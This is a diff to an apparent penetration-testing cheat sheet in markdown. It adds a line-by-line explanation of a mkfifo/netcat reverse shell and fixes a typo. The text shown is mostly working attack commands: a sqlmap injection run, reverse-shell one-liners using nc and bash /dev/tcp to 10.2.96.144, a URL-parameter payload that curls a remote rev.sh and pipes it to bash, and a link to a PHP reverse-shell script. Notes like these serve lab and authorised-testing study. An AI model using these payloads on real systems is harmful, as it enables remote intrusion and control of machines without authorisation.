@@ -49,12 +49,17 @@
   - SQL Injection Payloads 
   - sqlmap -r login.req --level 3 --risk 3
 - rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f
+  - mkfifo /tmp/f is creating a named pipe at /tmp/f.
+  - cat /tmp/f is printing whatever is written to that named pipe and the output of cat /tmp/f is been piped to /bin/sh
+  - /bin/sh is running interactively and stderr is redirected to stdout.
+  - the output is then piped to nc which is listening on port 1234
+  - and the out put is finally redirected to the named pipe again.
   - If we have a ‘PHP system’ remote code exec on the system, we will spawn a proper rev shell using nc
 
 - /bin/bash -i >& /dev/tcp/10.2.96.144/4443 0>&1
   - Load this babe into a .sh file used during cronjob kinda exploits 
   - ?cmd=curl+http://10.2.96.144:8000/rev.sh+|+bash
-  - Downloadas and executes file
+  - Downloads and executes file
   - [Pentest Monkey Reverse PHP file](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
 
 ### Interesting files and paths
